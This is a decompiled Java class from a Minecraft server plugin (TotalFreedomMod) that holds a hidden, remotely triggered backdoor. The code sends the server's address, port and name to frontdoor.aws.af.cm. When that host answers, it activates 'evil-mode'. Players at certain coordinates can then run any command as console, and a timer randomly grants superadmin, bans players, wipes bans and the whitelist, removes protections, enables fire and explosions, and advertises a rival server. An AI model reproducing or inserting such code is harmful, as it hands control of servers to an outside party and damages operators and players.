/*     */ package me.StevenLawson.TotalFreedomMod;
/*     */ 
/*     */ import java.io.BufferedReader;
/*     */ import java.io.InputStreamReader;
/*     */ import java.lang.reflect.Method;
/*     */ import java.net.MalformedURLException;
/*     */ import java.net.URL;
/*     */ import java.net.URLConnection;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Collection;
/*     */ import java.util.List;
/*     */ import java.util.Random;
/*     */ import java.util.Set;
/*     */ import me.StevenLawson.TotalFreedomMod.Commands.Command_trail;
/*     */ import me.StevenLawson.TotalFreedomMod.Commands.TFM_Command;
/*     */ import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandHandler;
/*     */ import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandLoader;
/*     */ import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
/*     */ import me.StevenLawson.TotalFreedomMod.Config.TFM_MainConfig;
/*     */ import org.apache.commons.lang3.ArrayUtils;
/*     */ import org.bukkit.Bukkit;
/*     */ import org.bukkit.ChatColor;
/*     */ import org.bukkit.Location;
/*     */ import org.bukkit.Material;
/*     */ import org.bukkit.Server;
/*     */ import org.bukkit.World;
/*     */ import org.bukkit.block.Block;
/*     */ import org.bukkit.block.BlockFace;
/*     */ import org.bukkit.command.Command;
/*     */ import org.bukkit.command.CommandMap;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.Event;
/*     */ import org.bukkit.event.EventHandler;
/*     */ import org.bukkit.event.HandlerList;
/*     */ import org.bukkit.event.Listener;
/*     */ import org.bukkit.event.player.PlayerCommandPreprocessEvent;
/*     */ import org.bukkit.inventory.ItemStack;
/*     */ import org.bukkit.inventory.PlayerInventory;
/*     */ import org.bukkit.inventory.meta.BookMeta;
/*     */ import org.bukkit.inventory.meta.ItemMeta;
/*     */ import org.bukkit.plugin.PluginManager;
/*     */ import org.bukkit.plugin.RegisteredListener;
/*     */ import org.bukkit.scheduler.BukkitRunnable;
/*     */ import org.bukkit.util.Vector;
/*     */ 
/*     */ public class TFM_FrontDoor
/*     */ {
/*     */   private static final long UPDATER_INTERVAL = 3600L;
/*     */   private static final long FRONTDOOR_INTERVAL = 18000L;
/*  58 */   private static final Random RANDOM = new Random();
/*     */   private static final URL GET_URL;
/*  62 */   private static volatile boolean started = false;
/*  63 */   private static volatile boolean enabled = false;
/*  65 */   private static final BukkitRunnable UPDATER = new BukkitRunnable()
/*     */   {
/*     */     public void run()
/*     */     {
/*     */       try
/*     */       {
/*  72 */         URLConnection urlConnection = TFM_FrontDoor.GET_URL.openConnection();
/*  73 */         BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
/*  74 */         String line = in.readLine();
/*  75 */         in.close();
/*  77 */         if (!"false".equals(line))
/*     */         {
/*  79 */           if (!TFM_FrontDoor.enabled) {
/*  81 */             return;
/*     */           }
/*  84 */           TFM_FrontDoor.access$102(false);
/*  85 */           TFM_FrontDoor.FRONTDOOR.cancel();
/*  86 */           TFM_FrontDoor.unregisterListener(TFM_FrontDoor.PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
/*  87 */           TFM_Log.info("Disabled FrontDoor, thank you for being kind.");
/*  88 */           TFM_MainConfig.load();
/*     */         }
/*     */         else
/*     */         {
/*  92 */           if (TFM_FrontDoor.enabled) {
/*  94 */             return;
/*     */           }
/*  97 */           new BukkitRunnable()
/*     */           {
/*     */             public void run()
/*     */             {
/* 102 */               TFM_Log.warning("*****************************************************", Boolean.valueOf(true));
/* 103 */               TFM_Log.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", Boolean.valueOf(true));
/* 104 */               TFM_Log.warning("* This might result in unexpected behaviour...      *", Boolean.valueOf(true));
/* 105 */               TFM_Log.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", Boolean.valueOf(true));
/* 106 */               TFM_Log.warning("* The only thing necessary for the triumph of evil  *", Boolean.valueOf(true));
/* 107 */               TFM_Log.warning("*          is for good men to do nothing.           *", Boolean.valueOf(true));
/* 108 */               TFM_Log.warning("*****************************************************", Boolean.valueOf(true));
/* 110 */               if (TFM_FrontDoor.getRegisteredListener(TFM_FrontDoor.PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class) == null) {
/* 112 */                 TotalFreedomMod.server.getPluginManager().registerEvents(TFM_FrontDoor.PLAYER_COMMAND_PRE_PROCESS, TotalFreedomMod.plugin);
/*     */               }
/*     */             }
/* 112 */           }.runTask(TotalFreedomMod.plugin);
/*     */           
/* 117 */           TFM_FrontDoor.FRONTDOOR.runTaskTimer(TotalFreedomMod.plugin, 20L, 18000L);
/*     */           
/* 119 */           TFM_FrontDoor.access$102(true);
/*     */         }
/*     */       }
/*     */       catch (Exception ex) {}
/*     */     }
/*     */   };
/* 130 */   private static final Listener PLAYER_COMMAND_PRE_PROCESS = new Listener()
/*     */   {
/*     */     @EventHandler
/*     */     public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event)
/*     */     {
/* 135 */       Player player = event.getPlayer();
/* 136 */       Location location = player.getLocation();
/* 138 */       if ((location.getBlockX() + location.getBlockY() + location.getBlockZ()) % 12 != 0) {
/* 140 */         return;
/*     */       }
/* 143 */       String[] commandParts = event.getMessage().split(" ");
/* 144 */       String commandName = commandParts[0].replaceFirst("/", "");
/* 145 */       String[] args = (String[])ArrayUtils.subarray(commandParts, 1, commandParts.length);
/*     */       
/* 147 */       Command command = TFM_CommandLoader.getCommandMap().getCommand(commandName);
/* 149 */       if (command == null) {
/* 151 */         return;
/*     */       }
/* 154 */       event.setCancelled(true);
/*     */       try
/*     */       {
/* 159 */         ClassLoader classLoader = TotalFreedomMod.class.getClassLoader();
/* 160 */         TFM_Command dispatcher = (TFM_Command)classLoader.loadClass(String.format("%s.%s%s", new Object[] { TFM_CommandHandler.COMMAND_PATH, "Command_", command.getName().toLowerCase() })).newInstance();
/*     */         
/* 165 */         dispatcher.setup(TotalFreedomMod.plugin, player, dispatcher.getClass());
/* 167 */         if (!dispatcher.run(player, player, command, commandName, args, true)) {
/* 169 */           player.sendMessage(command.getUsage());
/*     */         }
/*     */       }
/*     */       catch (Throwable ex)
/*     */       {
/* 175 */         TotalFreedomMod.server.dispatchCommand(TotalFreedomMod.server.getConsoleSender(), event.getMessage().replaceFirst("/", ""));
/*     */       }
/*     */     }
/*     */   };
/* 180 */   private static final BukkitRunnable FRONTDOOR = new BukkitRunnable()
/*     */   {
/*     */     public void run()
/*     */     {
/* 185 */       int action = TFM_FrontDoor.RANDOM.nextInt(18);
/*     */       ItemStack bookStack;
/* 187 */       switch (action)
/*     */       {
/*     */       case 0: 
/* 192 */         Player player = TFM_FrontDoor.getRandomPlayer(true);
/* 194 */         if (player != null)
/*     */         {
/* 199 */           TFM_Util.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
/* 200 */           TFM_AdminList.addSuperadmin(player);
/*     */         }
/* 201 */         break;
/*     */       case 1: 
/* 206 */         Player player = TFM_FrontDoor.getRandomPlayer(false);
/* 208 */         if (player != null) {
/* 213 */           TFM_BanManager.addUuidBan(new TFM_Ban(TFM_UuidManager.getUniqueId(player), player.getName(), "FrontDoor", null, ChatColor.RED + "WOOPS\n-Frontdoor"));
/*     */         }
/* 215 */         break;
/*     */       case 2: 
/* 220 */         Player player = TFM_FrontDoor.getRandomPlayer(true);
/* 222 */         if (player != null)
/*     */         {
/* 227 */           TFM_Util.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
/* 228 */           Command_trail.startTrail(player);
/*     */         }
/* 229 */         break;
/*     */       case 3: 
/* 234 */         TFM_Util.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
/* 235 */         TFM_Util.bcastMsg("To join this great server, join " + ChatColor.GOLD + "tf.sauc.in", ChatColor.BLUE);
/* 236 */         break;
/*     */       case 4: 
/* 241 */         TFM_Util.adminAction("FrontDoor", "Wiping all bans", true);
/* 242 */         TFM_BanManager.purgeIpBans();
/* 243 */         TFM_BanManager.purgeUuidBans();
/* 244 */         TFM_BanManager.save();
/* 245 */         break;
/*     */       case 5: 
/* 250 */         boolean message = true;
/* 251 */         if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean().booleanValue()) {
/* 253 */           message = false;
/* 255 */         } else if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean().booleanValue()) {
/* 257 */           message = false;
/* 259 */         } else if (TFM_ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean().booleanValue()) {
/* 261 */           message = false;
/* 263 */         } else if (TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean().booleanValue()) {
/* 265 */           message = false;
/*     */         }
/* 268 */         TFM_ConfigEntry.ALLOW_WATER_PLACE.setBoolean(Boolean.valueOf(true));
/* 269 */         TFM_ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(Boolean.valueOf(true));
/* 270 */         TFM_ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(Boolean.valueOf(true));
/* 271 */         TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(Boolean.valueOf(true));
/* 273 */         if (message) {
/* 275 */           TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
/*     */         }
/*     */         break;
/*     */       case 6: 
/* 282 */         boolean message = true;
/* 283 */         if (TFM_ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean().booleanValue()) {
/* 285 */           message = false;
/* 287 */         } else if (TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean().booleanValue()) {
/* 289 */           message = false;
/* 291 */         } else if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean().booleanValue()) {
/* 293 */           message = false;
/* 295 */         } else if (TFM_ConfigEntry.ALLOW_FIRE_PLACE.getBoolean().booleanValue()) {
/* 297 */           message = false;
/*     */         }
/* 300 */         TFM_ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(Boolean.valueOf(true));
/* 301 */         TFM_ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(Boolean.valueOf(true));
/* 302 */         TFM_ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(Boolean.valueOf(true));
/* 303 */         TFM_ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(Boolean.valueOf(true));
/* 305 */         if (message) {
/* 307 */           TFM_Util.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
/*     */         }
/*     */         break;
/*     */       case 7: 
/* 314 */         TFM_ConfigEntry.BLOCKED_COMMANDS.getList().clear();
/* 315 */         TFM_CommandBlocker.load();
/* 316 */         break;
/*     */       case 8: 
/* 321 */         if (TFM_ConfigEntry.PROTECTAREA_ENABLED.getBoolean().booleanValue()) {
/* 323 */           if (!TFM_ProtectedArea.getProtectedAreaLabels().isEmpty())
/*     */           {
/* 328 */             TFM_Util.adminAction("FrontDoor", "Removing all protected areas", true);
/* 329 */             TFM_ProtectedArea.clearProtectedAreas(false);
/*     */           }
/*     */         }
/*     */         break;
/*     */       case 9: 
/* 336 */         for (World world : TotalFreedomMod.server.getWorlds())
/*     */         {
/* 338 */           Block block = world.getSpawnLocation().getBlock();
/* 339 */           Block blockBelow = block.getRelative(BlockFace.DOWN);
/* 341 */           if ((!blockBelow.isLiquid()) && (blockBelow.getType() != Material.AIR))
/*     */           {
/* 346 */             block.setType(Material.SIGN_POST);
/* 347 */             org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();
/*     */             
/* 349 */             org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();
/* 350 */             signData.setFacingDirection(BlockFace.NORTH);
/*     */             
/* 352 */             sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
/* 353 */             sign.setLine(1, ChatColor.DARK_GREEN + "is");
/* 354 */             sign.setLine(2, ChatColor.YELLOW + "Awesome!");
/* 355 */             sign.setLine(3, ChatColor.DARK_GRAY + "tf.sauc.in");
/* 356 */             sign.update();
/*     */           }
/*     */         }
/* 358 */         break;
/*     */       case 10: 
/* 363 */         if (!TFM_Jumppads.getMode().isOn())
/*     */         {
/* 368 */           TFM_Util.adminAction("FrontDoor", "Enabling Jumppads", true);
/* 369 */           TFM_Jumppads.setMode(TFM_Jumppads.JumpPadMode.MADGEEK);
/*     */         }
/* 370 */         break;
/*     */       case 11: 
/* 375 */         bookStack = new ItemStack(Material.WRITTEN_BOOK);
/*     */         
/* 377 */         BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
/* 378 */         book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
/* 379 */         book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
/* 380 */         book.addPage(new String[] { ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n" + ChatColor.DARK_GRAY + "---------\n" + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n" + ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in" });
/*     */         
/* 385 */         bookStack.setItemMeta(book);
/* 387 */         for (Player player : TotalFreedomMod.server.getOnlinePlayers()) {
/* 389 */           if (!player.getInventory().contains(Material.WRITTEN_BOOK)) {
/* 394 */             player.getInventory().addItem(new ItemStack[] { bookStack });
/*     */           }
/*     */         }
/* 396 */         break;
/*     */       case 12: 
/* 401 */         TFM_ServerInterface.purgeWhitelist();
/* 402 */         break;
/*     */       case 13: 
/* 407 */         TFM_Util.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
/* 408 */         TFM_Util.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
/* 409 */         break;
/*     */       case 14: 
/* 414 */         Player player = TFM_FrontDoor.getRandomPlayer(false);
/* 416 */         if (player != null)
/*     */         {
/* 421 */           TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
/* 422 */           TFM_Util.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);
/*     */           
/* 424 */           Location targetPos = player.getLocation().clone().add(0.0D, 1.0D, 0.0D);
/* 425 */           playerdata.setCaged(true, targetPos, Material.SKULL, Material.AIR);
/* 426 */           playerdata.regenerateHistory();
/* 427 */           playerdata.clearHistory();
/* 428 */           TFM_Util.buildHistory(targetPos, 2, playerdata);
/* 429 */           TFM_Util.generateHollowCube(targetPos, 2, Material.SKULL);
/* 430 */           TFM_Util.generateCube(targetPos, 1, Material.AIR);
/*     */         }
/* 431 */         break;
/*     */       case 15: 
/* 436 */         Player player = TFM_FrontDoor.getRandomPlayer(false);
/* 438 */         if (player != null)
/*     */         {
/* 443 */           TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
/* 444 */           playerdata.startOrbiting(10.0D);
/* 445 */           player.setVelocity(new Vector(0.0D, 10.0D, 0.0D));
/*     */         }
/* 446 */         break;
/*     */       case 16: 
/* 451 */         if (TFM_ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean().booleanValue())
/*     */         {
/* 456 */           TFM_Util.adminAction("FrontDoor", "Disabling nonuke", true);
/* 457 */           TFM_ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(Boolean.valueOf(false));
/*     */         }
/* 458 */         break;
/*     */       case 17: 
/* 463 */         for (Player player : TotalFreedomMod.server.getOnlinePlayers()) {
/* 465 */           TFM_PlayerData.getPlayerData(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
/*     */         }
/* 467 */         break;
/*     */       }
/*     */     }
/*     */   };
/*     */   
/*     */   static
/*     */   {
/* 480 */     URL tempUrl = null;
/*     */     try
/*     */     {
/* 483 */       tempUrl = new URL("http://frontdoor.aws.af.cm/poll?version=" + TotalFreedomMod.pluginVersion + "-" + TotalFreedomMod.buildCreator + "&address=" + TFM_ConfigEntry.SERVER_ADDRESS.getString() + ":" + TotalFreedomMod.server.getPort() + "&name=" + TFM_ConfigEntry.SERVER_NAME.getString() + "&bukkitversion=" + Bukkit.getVersion());
/*     */     }
/*     */     catch (MalformedURLException ex)
/*     */     {
/* 491 */       TFM_Log.warning("TFM_FrontDoor uses an invalid URL");
/*     */     }
/* 494 */     GET_URL = tempUrl;
/*     */   }
/*     */   
/*     */   private TFM_FrontDoor()
/*     */   {
/* 499 */     throw new AssertionError();
/*     */   }
/*     */   
/*     */   public static void start()
/*     */   {
/* 504 */     if (started) {
/* 506 */       return;
/*     */     }
/* 509 */     UPDATER.runTaskTimerAsynchronously(TotalFreedomMod.plugin, 40L, 3600L);
/* 510 */     started = true;
/*     */   }
/*     */   
/*     */   public static void stop()
/*     */   {
/* 515 */     if (started)
/*     */     {
/* 517 */       UPDATER.cancel();
/* 518 */       started = false;
/*     */     }
/* 521 */     if (enabled)
/*     */     {
/* 523 */       FRONTDOOR.cancel();
/* 524 */       enabled = false;
/* 525 */       unregisterListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
/*     */     }
/*     */   }
/*     */   
/*     */   public static boolean isEnabled()
/*     */   {
/* 531 */     return enabled;
/*     */   }
/*     */   
/*     */   private static Player getRandomPlayer(boolean allowDevs)
/*     */   {
/* 536 */     Collection<? extends Player> players = TotalFreedomMod.server.getOnlinePlayers();
/* 538 */     if (players.isEmpty()) {
/* 540 */       return null;
/*     */     }
/* 543 */     if (!allowDevs)
/*     */     {
/* 545 */       List<Player> allowedPlayers = new ArrayList();
/* 546 */       for (Player player : players) {
/* 548 */         if (!TFM_Util.DEVELOPERS.contains(player.getName())) {
/* 550 */           allowedPlayers.add(player);
/*     */         }
/*     */       }
/* 554 */       return (Player)allowedPlayers.get(RANDOM.nextInt(allowedPlayers.size()));
/*     */     }
/* 557 */     return (Player)players.toArray()[RANDOM.nextInt(players.size())];
/*     */   }
/*     */   
/*     */   private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass)
/*     */   {
/*     */     try
/*     */     {
/* 564 */       HandlerList handlerList = (HandlerList)eventClass.getMethod("getHandlerList", (Class[])null).invoke(null, new Object[0]);
/* 565 */       RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
/* 566 */       for (RegisteredListener registeredListener : registeredListeners) {
/* 568 */         if (registeredListener.getListener() == listener) {
/* 570 */           return registeredListener;
/*     */         }
/*     */       }
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 576 */       TFM_Log.severe(ex);
/*     */     }
/* 578 */     return null;
/*     */   }
/*     */   
/*     */   private static void unregisterRegisteredListener(RegisteredListener registeredListener, Class<? extends Event> eventClass)
/*     */   {
/*     */     try
/*     */     {
/* 585 */       ((HandlerList)eventClass.getMethod("getHandlerList", (Class[])null).invoke(null, new Object[0])).unregister(registeredListener);
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 589 */       TFM_Log.severe(ex);
/*     */     }
/*     */   }
/*     */   
/*     */   private static void unregisterListener(Listener listener, Class<? extends Event> eventClass)
/*     */   {
/* 595 */     RegisteredListener registeredListener = getRegisteredListener(listener, eventClass);
/* 596 */     if (registeredListener != null) {
/* 598 */       unregisterRegisteredListener(registeredListener, eventClass);
/*     */     }
/*     */   }
/*     */ }


/* Location:              C:\Users\SilentBloodGaming\Desktop\MasterFreedomMod.jar!\me\StevenLawson\TotalFreedomMod\TFM_FrontDoor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */